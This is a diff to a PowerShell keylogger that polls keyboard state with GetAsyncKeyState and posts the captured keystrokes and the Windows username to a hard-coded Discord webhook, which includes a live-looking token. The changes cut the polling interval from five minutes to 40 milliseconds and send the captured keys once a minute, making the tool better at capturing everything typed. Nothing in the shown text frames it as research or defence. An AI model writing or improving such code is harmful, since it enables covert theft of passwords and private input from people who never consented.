@@ -1,8 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# Replace webhookUrl:
+#replace webhookUrl:
 $webhookUrl = "https://discord.com/api/webhooks/1201584980145483938/iFaYNb6rbrYGwyMqyMMA9J2GymXXOlDTqFP1pyxo3rtO3ZQ4oLDh34Ubu1-pye3dd8qw"
-
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -13,8 +11,8 @@ function Upload-Discord {
     )
 
     $Body = @{
-        'username' = $env:username
-        'content' = $text
+      'username' = $env:username
+      'content' = $text
     }
 
     if (-not ([string]::IsNullOrEmpty($text))){
@@ -51,11 +49,10 @@ function Start-InputCatcher {
     try {
         Write-Host 'Running...' -ForegroundColor Red
 
-        $lastMinute = -1  # Initialize lastMinute to a value that won't interfere with the check
-        $intervalInMinutes = 5  # Set the desired interval in minutes
+        $lastMinute = -5  # Initialize lastMinute to a value that won't interfere with the check
 
         while ($true) {
-            Start-Sleep -Minutes $intervalInMinutes  # Adjust the sleep interval to 5 minutes
+            Start-Sleep -Milliseconds 40
 
             for ($ascii = 9; $ascii -le 254; $ascii++) {
                 $state = $API::GetAsyncKeyState($ascii)
@@ -75,7 +72,7 @@ function Start-InputCatcher {
                 }
             }
 
-            # Display the first 2000 captured keys every 5 minutes
+            # Display the first 2000 captured keys once per minute
             $currentMinute = (Get-Date).Minute
             if ($currentMinute -ne $lastMinute) {
                 $firstTwoThousandKeys = $capturedKeys[0..1999] -join ''
